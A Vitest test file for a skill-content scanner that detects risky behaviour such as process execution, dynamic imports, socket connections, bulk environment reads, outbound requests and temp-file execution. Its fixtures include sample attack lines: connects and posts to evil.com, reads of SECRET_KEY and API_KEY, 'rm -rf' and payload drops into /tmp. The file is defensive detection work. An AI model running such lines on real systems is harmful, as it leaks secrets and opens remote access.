import { describe, it, expect } from 'vitest';
import { scanSkillContent } from '../src/scanner.ts';

describe('behavioral analysis rules', () => {
  // ── Code execution primitives ───────────────────────────────────────────

  describe('exec-python-os-system', () => {
    it('detects os.system() call', () => {
      const files = new Map([['script.py', 'os.system("rm -rf /tmp/data")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-os-system')).toBe(true);
    });

    it('detects os.system() after semicolon', () => {
      const files = new Map([['script.py', 'import os;os.system("whoami")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-os-system')).toBe(true);
    });

    it('does not match os.system in middle of word', () => {
      const files = new Map([['script.py', 'chaos.system("test")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-os-system')).toBe(false);
    });
  });

  describe('exec-python-subprocess', () => {
    it('detects subprocess.call()', () => {
      const files = new Map([['script.py', 'subprocess.call(["ls", "-la"])']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-subprocess')).toBe(true);
    });

    it('detects subprocess.Popen()', () => {
      const files = new Map([['script.py', 'p = subprocess.Popen(cmd, shell=True)']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-subprocess')).toBe(true);
    });

    it('detects subprocess.check_output()', () => {
      const files = new Map([['script.py', 'output = subprocess.check_output(["id"])']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-subprocess')).toBe(true);
    });

    it('detects subprocess.run()', () => {
      const files = new Map([['script.py', 'subprocess.run(["echo", "hello"])']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-subprocess')).toBe(true);
    });
  });

  describe('exec-python-exec', () => {
    it('detects exec(compile(...))', () => {
      const files = new Map([['script.py', 'exec(compile(code, "<string>", "exec"))']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-exec')).toBe(true);
    });

    it('detects eval(__import__(...))', () => {
      const files = new Map([['script.py', 'eval(__import__("os").system("id"))']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-exec')).toBe(true);
    });

    it('does not match cursor.execute()', () => {
      const files = new Map([['script.py', 'cursor.execute("SELECT * FROM users")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-exec')).toBe(false);
    });

    it('does not match bare exec()', () => {
      const files = new Map([['script.py', 'exec("print(1)")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-exec')).toBe(false);
    });
  });

  describe('exec-python-dynamic-import', () => {
    it('detects __import__()', () => {
      const files = new Map([['script.py', '__import__("os").system("id")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-dynamic-import')).toBe(true);
    });

    it('detects importlib.import_module()', () => {
      const files = new Map([['script.py', 'importlib.import_module("subprocess")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-dynamic-import')).toBe(true);
    });

    it('does not match static import os', () => {
      const files = new Map([['script.py', 'import os']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-dynamic-import')).toBe(false);
    });
  });

  describe('exec-js-child-process', () => {
    it('detects child_process.exec()', () => {
      const files = new Map([['script.js', 'child_process.exec("ls -la")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-child-process')).toBe(true);
    });

    it('detects require("child_process").execSync()', () => {
      const files = new Map([['script.js', 'require("child_process").execSync("whoami")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-child-process')).toBe(true);
    });

    it('detects child_process.spawn()', () => {
      const files = new Map([['script.js', 'child_process.spawn("node", ["app.js"])']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-child-process')).toBe(true);
    });
  });

  describe('exec-js-new-function', () => {
    it('detects new Function()', () => {
      const files = new Map([['script.js', 'const fn = new Function("return 42")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-new-function')).toBe(true);
    });
  });

  describe('exec-python-socket', () => {
    it('detects socket.connect()', () => {
      const files = new Map([['script.py', 's.socket.connect(("evil.com", 4444))']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-socket')).toBe(true);
    });

    it('detects socket.create_connection()', () => {
      const files = new Map([['script.py', 'socket.create_connection(("evil.com", 80))']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-socket')).toBe(true);
    });
  });

  // ── Environment variable bulk access ────────────────────────────────────

  describe('exec-python-environ', () => {
    it('detects os.environ[...]', () => {
      const files = new Map([['script.py', 'val = os.environ["SECRET_KEY"]']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-environ')).toBe(true);
    });

    it('detects os.environ.get()', () => {
      const files = new Map([['script.py', 'val = os.environ.get("API_KEY")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-environ')).toBe(true);
    });

    it('detects os.environ.items()', () => {
      const files = new Map([['script.py', 'for k, v in os.environ.items():']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-environ')).toBe(true);
    });

    it('detects os.environ.copy()', () => {
      const files = new Map([['script.py', 'env = os.environ.copy()']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-environ')).toBe(true);
    });

    it('has medium severity', () => {
      const files = new Map([['script.py', 'os.environ["KEY"]']]);
      const result = scanSkillContent('test', files);
      const finding = result.findings.find((f) => f.rule === 'exec-python-environ');
      expect(finding?.severity).toBe('medium');
    });
  });

  describe('exec-js-process-env-bulk', () => {
    it('detects Object.keys(process.env)', () => {
      const files = new Map([['script.js', 'const keys = Object.keys(process.env)']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-process-env-bulk')).toBe(true);
    });

    it('detects JSON.stringify(process.env)', () => {
      const files = new Map([['script.js', 'const data = JSON.stringify(process.env)']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-process-env-bulk')).toBe(true);
    });

    it('detects Object.entries(process.env)', () => {
      const files = new Map([['script.js', 'Object.entries(process.env).forEach(...)']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-process-env-bulk')).toBe(true);
    });

    it('does not match single process.env.NODE_ENV', () => {
      const files = new Map([['script.js', 'const env = process.env.NODE_ENV']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-js-process-env-bulk')).toBe(false);
    });
  });

  // ── Network primitives ──────────────────────────────────────────────────

  describe('exec-python-requests', () => {
    it('detects requests.post()', () => {
      const files = new Map([['script.py', 'requests.post("https://evil.com", data=payload)']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-requests')).toBe(true);
    });

    it('detects requests.put()', () => {
      const files = new Map([['script.py', 'requests.put("https://api.example.com/data")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-requests')).toBe(true);
    });

    it('detects urllib.request.urlopen()', () => {
      const files = new Map([['script.py', 'urllib.request.urlopen("https://evil.com")']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-requests')).toBe(true);
    });

    it('has medium severity', () => {
      const files = new Map([['script.py', 'requests.post("https://api.com/data")']]);
      const result = scanSkillContent('test', files);
      const finding = result.findings.find((f) => f.rule === 'exec-python-requests');
      expect(finding?.severity).toBe('medium');
    });
  });

  describe('exec-python-http-server', () => {
    it('detects http.server', () => {
      const files = new Map([['script.py', 'python -m http.server 8080']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-http-server')).toBe(true);
    });

    it('detects SimpleHTTPServer', () => {
      const files = new Map([['script.py', 'python -m SimpleHTTPServer']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-http-server')).toBe(true);
    });

    it('detects HTTPServer class', () => {
      const files = new Map([['script.py', 'server = HTTPServer(("", 8080), Handler)']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-python-http-server')).toBe(true);
    });
  });

  // ── Temp file + execute chain ───────────────────────────────────────────

  describe('exec-tempfile-execute', () => {
    it('detects /tmp/ write + chmod +x', () => {
      const files = new Map([['SKILL.md', 'Write to /tmp/payload then chmod +x it']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-tempfile-execute')).toBe(true);
    });

    it('detects /tmp/ write + python execution', () => {
      const files = new Map([['SKILL.md', 'Save to /tmp/script.py and run python /tmp/script.py']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-tempfile-execute')).toBe(true);
    });

    it('detects mktemp + bash execution', () => {
      const files = new Map([['script.sh', 'f=$(mktemp) && echo "payload" > $f && bash $f']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-tempfile-execute')).toBe(true);
    });

    it('detects tempfile + node execution', () => {
      const files = new Map([['script.py', 'import tempfile; node /tmp/script.js']]);
      const result = scanSkillContent('test', files);
      expect(result.findings.some((f) => f.rule === 'exec-tempfile-execute')).toBe(true);
    });
  });
});
